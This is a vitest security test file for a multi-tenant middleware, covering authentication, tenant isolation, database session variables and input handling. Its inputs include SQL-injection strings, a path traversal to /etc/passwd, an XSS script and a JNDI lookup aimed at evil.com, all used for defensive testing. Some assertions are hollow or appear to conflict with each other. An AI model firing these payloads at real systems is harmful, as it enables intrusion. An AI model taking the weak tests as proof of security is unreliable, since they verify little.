/**
 * Tenant Context Middleware Security Tests
 *
 * Comprehensive security testing for tenant-context.ts
 * Tests tenant isolation, context validation, database session configuration, and security edge cases
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { HTTPException } from 'hono/http-exception'
import type { Next } from 'hono'
import { PrismaClient } from '@pems/database'
import {
  tenantContextMiddleware,
  optionalTenantContext,
  getTenantContext,
  getUserContext,
  TENANT_CONTEXT_KEY,
  USER_CONTEXT_KEY,
  type TenantContext,
} from '../src/tenant-context'

// Mock auth middleware functions
vi.mock('../src/auth-middleware', () => ({
  getAuthContext: vi.fn(),
  getCurrentUser: vi.fn(),
}))

import { getAuthContext, getCurrentUser } from '../src/auth-middleware'

const mockGetAuthContext = vi.mocked(getAuthContext)
const mockGetCurrentUser = vi.mocked(getCurrentUser)

// Mock console methods
const consoleSpy = {
  error: vi.spyOn(console, 'error').mockImplementation(() => {}),
  warn: vi.spyOn(console, 'warn').mockImplementation(() => {}),
}

// Mock Prisma Client
const mockPrisma = {
  tenant: {
    findUnique: vi.fn(),
  },
  $executeRaw: vi.fn(),
} as any

describe('Security: TenantContextMiddleware', () => {
  let mockNext: ReturnType<typeof vi.fn> & Next
  let mockContext: any

  beforeEach(() => {
    vi.clearAllMocks()
    mockNext = vi.fn().mockResolvedValue(undefined)
    mockContext = {
      req: {
        path: '/test',
        header: vi.fn(),
        query: vi.fn(),
      },
      set: vi.fn(),
      get: vi.fn((key: string) => {
        if (key === TENANT_CONTEXT_KEY) return mockContext._tenantContext
        if (key === USER_CONTEXT_KEY) return mockContext._userContext
        return null
      }),
      _tenantContext: null as any,
      _userContext: null as any,
    }
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('Authentication Requirement Security', () => {
    it('should reject unauthenticated users', async () => {
      mockGetAuthContext.mockReturnValue({
        isAuthenticated: false,
        user: null,
        session: null,
      })

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        HTTPException,
      )

      try {
        await middleware(mockContext, mockNext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(401)
        expect((error as HTTPException).message).toBe(
          'Authentication required for tenant context',
        )
      }

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should proceed for authenticated users', async () => {
      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
    })
  })

  describe('Tenant ID Resolution Security', () => {
    it('should use user tenant ID for regular users', async () => {
      setupAuthenticatedUser({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: 'user-tenant-id',
        isSystemAdmin: false,
      })

      setupValidTenant('user-tenant-id')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.tenant.findUnique).toHaveBeenCalledWith({
        where: { id: 'user-tenant-id' },
        select: { id: true, name: true, slug: true },
      })

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(tenantContext.tenantId).toBe('user-tenant-id')
    })

    it('should allow system admins to use X-Tenant-ID header', async () => {
      const systemAdminUser = {
        id: 'admin-1',
        email: 'admin@example.com',
        tenantId: 'admin-tenant-id',
        isSystemAdmin: true,
      }

      setupAuthenticatedUser(systemAdminUser)
      mockContext.req.header = vi.fn((name: string) => {
        if (name === 'X-Tenant-ID') return 'header-tenant-id'
        return null
      })

      setupValidTenant('header-tenant-id')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.tenant.findUnique).toHaveBeenCalledWith({
        where: { id: 'header-tenant-id' },
        select: { id: true, name: true, slug: true },
      })

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(tenantContext.tenantId).toBe('header-tenant-id')
    })

    it('should allow system admins to use tenantId query parameter', async () => {
      const systemAdminUser = {
        id: 'admin-1',
        email: 'admin@example.com',
        tenantId: 'admin-tenant-id',
        isSystemAdmin: true,
      }

      setupAuthenticatedUser(systemAdminUser)
      mockContext.req.query = vi.fn((name?: string) => {
        if (name === 'tenantId') return 'query-tenant-id'
        return {}
      })

      setupValidTenant('query-tenant-id')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.tenant.findUnique).toHaveBeenCalledWith({
        where: { id: 'query-tenant-id' },
        select: { id: true, name: true, slug: true },
      })
    })

    it('should fallback to system admin tenant ID if no override provided', async () => {
      const systemAdminUser = {
        id: 'admin-1',
        email: 'admin@example.com',
        tenantId: 'admin-tenant-id',
        isSystemAdmin: true,
      }

      setupAuthenticatedUser(systemAdminUser)
      // No header or query parameter provided

      setupValidTenant('admin-tenant-id')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.tenant.findUnique).toHaveBeenCalledWith({
        where: { id: 'admin-tenant-id' },
        select: { id: true, name: true, slug: true },
      })
    })

    it('should prevent regular users from accessing other tenants', async () => {
      const regularUser = {
        id: 'user-1',
        email: 'user@example.com',
        tenantId: 'user-tenant-id',
        isSystemAdmin: false,
      }

      setupAuthenticatedUser(regularUser)

      // User tries to access different tenant via header
      mockContext.req.header = vi.fn((name: string) => {
        if (name === 'X-Tenant-ID') return 'other-tenant-id'
        return null
      })

      setupValidTenant('user-tenant-id') // Only their own tenant exists

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      // Should still use their own tenant ID, not the header
      expect(mockPrisma.tenant.findUnique).toHaveBeenCalledWith({
        where: { id: 'user-tenant-id' },
        select: { id: true, name: true, slug: true },
      })

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(tenantContext.tenantId).toBe('user-tenant-id')
    })
  })

  describe('Tenant Validation Security', () => {
    it('should reject requests for non-existent tenants', async () => {
      setupAuthenticatedUser()
      mockPrisma.tenant.findUnique.mockResolvedValue(null)

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        HTTPException,
      )

      try {
        await middleware(mockContext, mockNext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(401)
        expect((error as HTTPException).message).toBe('Invalid tenant')
      }

      expect(mockNext).not.toHaveBeenCalled()
    })

    it('should handle database errors during tenant validation', async () => {
      setupAuthenticatedUser()
      mockPrisma.tenant.findUnique.mockRejectedValue(new Error('Database error'))

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        HTTPException,
      )

      try {
        await middleware(mockContext, mockNext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(401)
        expect((error as HTTPException).message).toBe(
          'Tenant context setup failed',
        )
      }

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Tenant context middleware error:',
        expect.any(Error),
      )
    })

    it('should reject requests when user has no tenant ID', async () => {
      setupAuthenticatedUser({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: undefined, // No tenant ID
        isSystemAdmin: false,
      })

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        HTTPException,
      )

      try {
        await middleware(mockContext, mockNext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(401)
        expect((error as HTTPException).message).toBe('Tenant context required')
      }

      expect(mockNext).not.toHaveBeenCalled()
    })
  })

  describe('Database Session Configuration Security', () => {
    it('should configure database session variables for regular users', async () => {
      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_tenant_id'),
      )
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        'SET app.is_system_admin = false',
      )
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_user_id'),
      )
    })

    it('should configure database session variables for system admins', async () => {
      setupAuthenticatedUser({
        id: 'admin-1',
        email: 'admin@example.com',
        tenantId: 'admin-tenant-id',
        isSystemAdmin: true,
      })

      setupValidTenant('admin-tenant-id')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_tenant_id'),
      )
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        'SET app.is_system_admin = true',
      )
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_user_id'),
      )
    })

    it('should handle database session configuration errors', async () => {
      setupAuthenticatedUser()
      setupValidTenant()
      mockPrisma.$executeRaw.mockRejectedValue(new Error('Session config failed'))

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).rejects.toThrow(
        HTTPException,
      )

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Tenant context middleware error:',
        expect.any(Error),
      )
    })

    it('should prevent SQL injection in session variables', async () => {
      const maliciousTenantId = "'; DROP TABLE tenants; --"
      const maliciousUserId = "'; DROP TABLE users; --"

      setupAuthenticatedUser({
        id: maliciousUserId,
        email: 'user@example.com',
        tenantId: maliciousTenantId,
        isSystemAdmin: false,
      })

      setupValidTenant(maliciousTenantId)

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      // Verify that parameters are properly parameterized
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_tenant_id ='),
      )
      expect(mockPrisma.$executeRaw).toHaveBeenCalledWith(
        expect.stringContaining('SET app.current_user_id ='),
      )

      // The malicious content should be safely parameterized
      const calls = mockPrisma.$executeRaw.mock.calls
      expect(calls.some((call: any) => typeof call[0] === 'string')).toBe(true)
    })
  })

  describe('Context Management Security', () => {
    it('should set tenant context correctly', async () => {
      setupAuthenticatedUser()
      setupValidTenant('test-tenant-id', 'Test Tenant')

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(tenantContext).toEqual({
        tenantId: 'test-tenant-id',
        tenantName: 'Test Tenant',
        isSystemAdmin: false,
        userId: 'user-1',
      })
    })

    it('should set context variables with proper types', async () => {
      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = tenantContextMiddleware(mockPrisma)

      await middleware(mockContext, mockNext)

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(typeof tenantContext.tenantId).toBe('string')
      expect(typeof tenantContext.tenantName).toBe('string')
      expect(typeof tenantContext.isSystemAdmin).toBe('boolean')
      expect(typeof tenantContext.userId).toBe('string')
    })
  })

  describe('Optional Tenant Context Security', () => {
    it('should work without authentication for optional context', async () => {
      mockContext.req.header = vi.fn(() => null) // No auth header

      const middleware = optionalTenantContext(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled()
      expect(mockPrisma.tenant.findUnique).not.toHaveBeenCalled()
    })

    it('should set tenant context when authenticated for optional context', async () => {
      mockContext.req.header = vi.fn((name: string) => {
        if (name === 'Authorization') return 'Bearer valid-token'
        return null
      })

      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = optionalTenantContext(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockPrisma.tenant.findUnique).toHaveBeenCalled()
      expect(mockContext.get(TENANT_CONTEXT_KEY)).toBeTruthy()
    })

    it('should handle errors gracefully in optional context', async () => {
      mockContext.req.header = vi.fn((name: string) => {
        if (name === 'Authorization') return 'Bearer valid-token'
        return null
      })

      setupAuthenticatedUser()
      mockPrisma.tenant.findUnique.mockRejectedValue(new Error('Database error'))

      const middleware = optionalTenantContext(mockPrisma)

      await middleware(mockContext, mockNext)

      expect(mockNext).toHaveBeenCalled() // Should continue despite error
      expect(consoleSpy.warn).toHaveBeenCalledWith(
        'Optional tenant context failed:',
        expect.any(Error),
      )
    })
  })

  describe('Helper Functions Security', () => {
    it('getTenantContext should throw when context is missing', () => {
      expect(() => getTenantContext(mockContext)).toThrow(HTTPException)

      try {
        getTenantContext(mockContext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(500)
        expect((error as HTTPException).message).toBe('Tenant context not found')
      }
    })

    it('getUserContext should throw when context is missing', () => {
      expect(() => getUserContext(mockContext)).toThrow(HTTPException)

      try {
        getUserContext(mockContext)
      } catch (error) {
        expect(error).toBeInstanceOf(HTTPException)
        expect((error as HTTPException).status).toBe(500)
        expect((error as HTTPException).message).toBe('User context not found')
      }
    })

    it('getTenantContext should return valid context when present', async () => {
      const expectedContext: TenantContext = {
        tenantId: 'test-tenant',
        tenantName: 'Test Tenant',
        isSystemAdmin: false,
        userId: 'user-1',
      }

      mockContext._tenantContext = expectedContext

      const result = getTenantContext(mockContext)
      expect(result).toEqual(expectedContext)
    })
  })

  describe('Input Validation Security', () => {
    it('should handle malicious tenant IDs safely', async () => {
      const maliciousTenantIds = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        "' OR '1'='1",
        '${jndi:ldap://evil.com/a}',
        'null',
        'undefined',
        '{}',
        '[]',
        '',
      ]

      for (const maliciousId of maliciousTenantIds) {
        vi.clearAllMocks()
        setupAuthenticatedUser({
          id: 'user-1',
          email: 'user@example.com',
          tenantId: maliciousId,
          isSystemAdmin: false,
        })

        // Mock tenant exists
        mockPrisma.tenant.findUnique.mockResolvedValue({
          id: maliciousId,
          name: 'Malicious Tenant',
          slug: 'malicious-tenant',
        })

        const middleware = tenantContextMiddleware(mockPrisma)

        // Should not crash with malicious input
        await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()

        const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
        expect(tenantContext.tenantId).toBe(maliciousId)

        mockNext.mockClear()
      }
    })

    it('should handle extremely long tenant IDs', async () => {
      const longTenantId = 'a'.repeat(10000)

      setupAuthenticatedUser({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: longTenantId,
        isSystemAdmin: false,
      })

      setupValidTenant(longTenantId)

      const middleware = tenantContextMiddleware(mockPrisma)

      // Should handle long IDs without issues
      await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()

      const tenantContext = mockContext.get(TENANT_CONTEXT_KEY)
      expect(tenantContext.tenantId).toBe(longTenantId)
    })

    it('should handle special characters in tenant IDs', async () => {
      const specialTenantId = '!@#$%^&*()_+-=[]{}|;:,.<>?`~"\''

      setupAuthenticatedUser({
        id: 'user-1',
        email: 'user@example.com',
        tenantId: specialTenantId,
        isSystemAdmin: false,
      })

      setupValidTenant(specialTenantId)

      const middleware = tenantContextMiddleware(mockPrisma)

      await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()
    })
  })

  describe('Cross-Tenant Access Prevention', () => {
    it('should prevent tenant enumeration attacks', async () => {
      const regularUser = {
        id: 'user-1',
        email: 'user@example.com',
        tenantId: 'legitimate-tenant-id',
        isSystemAdmin: false,
      }

      setupAuthenticatedUser(regularUser)

      const maliciousTenantIds = [
        'tenant-1',
        'tenant-2',
        'tenant-3',
        'admin-tenant',
        'system-tenant',
        '../../../etc/passwd',
      ]

      for (const maliciousId of maliciousTenantIds) {
        vi.clearAllMocks()

        mockContext.req.header = vi.fn((name: string) => {
          if (name === 'X-Tenant-ID') return maliciousId
          return null
        })

        mockContext.req.query = vi.fn((name?: string) => {
          if (name === 'tenantId') return maliciousId
          return {}
        })

        // Mock that only the legitimate tenant exists
        mockPrisma.tenant.findUnique.mockImplementation((args: any) => {
          if (args.where.id === 'legitimate-tenant-id') {
            return Promise.resolve({
              id: 'legitimate-tenant-id',
              name: 'Legitimate Tenant',
              slug: 'legitimate-tenant',
            })
          }
          return Promise.resolve(null)
        })

        const middleware = tenantContextMiddleware(mockPrisma)

        if (maliciousId === 'legitimate-tenant-id') {
          await expect(middleware(mockContext, mockNext)).resolves.not.toThrow()
        } else {
          await expect(middleware(mockContext, mockNext)).rejects.toThrow(
            HTTPException,
          )
        }

        mockNext.mockClear()
      }
    })
  })

  describe('Performance and Memory Security', () => {
    it('should not leak memory with repeated calls', async () => {
      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = tenantContextMiddleware(mockPrisma)

      for (let i = 0; i < 100; i++) {
        const newContext = { ...mockContext, _tenantContext: null, _userContext: null }
        await middleware(newContext, vi.fn().mockResolvedValue(undefined))
      }

      // Test passes if no memory leaks occur
      expect(true).toBe(true)
    })

    it('should handle concurrent requests safely', async () => {
      setupAuthenticatedUser()
      setupValidTenant()

      const middleware = tenantContextMiddleware(mockPrisma)

      const promises = Array.from({ length: 50 }, () => {
        const newContext = { ...mockContext, _tenantContext: null, _userContext: null }
        return middleware(newContext, mockNext)
      })

      await Promise.allSettled(promises)

      expect(mockNext).toHaveBeenCalledTimes(50)
    })
  })

  // Helper function to set up authenticated user
  function setupAuthenticatedUser(user: any = {
    id: 'user-1',
    email: 'user@example.com',
    tenantId: 'test-tenant-id',
    isSystemAdmin: false,
    emailVerified: true,
    createdAt: new Date(),
    updatedAt: new Date(),
  }) {
    mockGetAuthContext.mockReturnValue({
      isAuthenticated: true,
      user,
      session: {
        id: 'session-1',
        userId: user.id,
        expiresAt: new Date(),
        token: 'session-token-1',
        createdAt: new Date(),
        updatedAt: new Date(),
      },
    })

    mockGetCurrentUser.mockReturnValue(user)
  }

  // Helper function to set up valid tenant
  function setupValidTenant(tenantId: string = 'test-tenant-id', tenantName: string = 'Test Tenant') {
    mockPrisma.tenant.findUnique.mockResolvedValue({
      id: tenantId,
      name: tenantName,
      slug: 'test-tenant',
    })
  }
})